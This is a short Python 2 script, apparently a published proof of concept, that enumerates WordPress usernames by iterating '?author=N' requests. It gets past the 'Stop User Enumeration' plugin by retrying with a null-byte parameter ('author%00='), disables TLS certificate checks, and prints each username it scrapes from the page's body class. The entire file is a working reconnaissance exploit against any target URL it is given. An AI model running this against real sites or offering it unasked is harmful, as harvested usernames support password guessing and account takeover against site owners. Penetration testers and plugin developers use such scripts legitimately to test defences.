#!/usr/bin/python

#Python script to perform WordPress user enumeration even if "Stop User Enumeration" plug-in is installed
#Tested on:
#Windows,Linux
#WordPress v4.2.2
#Stop User Enumeration v1.3.1

try:
	from bs4 import BeautifulSoup
	import urllib2
	import requests
	import sys
	import ssl
except Exception,e:
	print "[!] Error: "+str(e)
	print "[*] Make sure you have the following Python modules installed:\n\tbs4, urllib2, requests, sys, ssl"
	exit(0)

if len(sys.argv)!=4:
	print "Usage: %s <target> <min_author_value> <max_author_value>"%sys.argv[0]
	exit(0)

target = sys.argv[1]
	
if target.endswith("/"):
	target = target[:-1]
	
if hasattr(ssl, '_create_unverified_context'):
	ssl._create_default_https_context = ssl._create_unverified_context

print "[*] Started"
try:
    requests.packages.urllib3.disable_warnings()
except:
    pass
for i in range(int(sys.argv[2]),int(sys.argv[3])+1):
	try:
		#print target+"/?author="+str(i)
		#r = requests.get(sys.argv[1]+"/?qwe=asd&author%00="+str(i), verify=False)
		target_url = target+"/?author="+str(i)
		r = requests.get(target_url, verify=False)
		sc = r.status_code
		if sc==500:
			target_url = target+"/?a=b&author%00="+str(i)
		r = requests.get(target_url, verify=False)
		sc = r.status_code
		if sc != 404 and sc != 500:
			html = urllib2.urlopen(target_url)
			soup = BeautifulSoup(html.read(), "lxml")
			tag = soup.body
			uname = (tag['class'][2]).replace("author-","")
			#print str(i) + " : " + str(sc)
			print str(i) + " : " + str(uname)
	except Exception,e:
		#print "Exception occurred"
		print str(e)
print "[*] Completed"
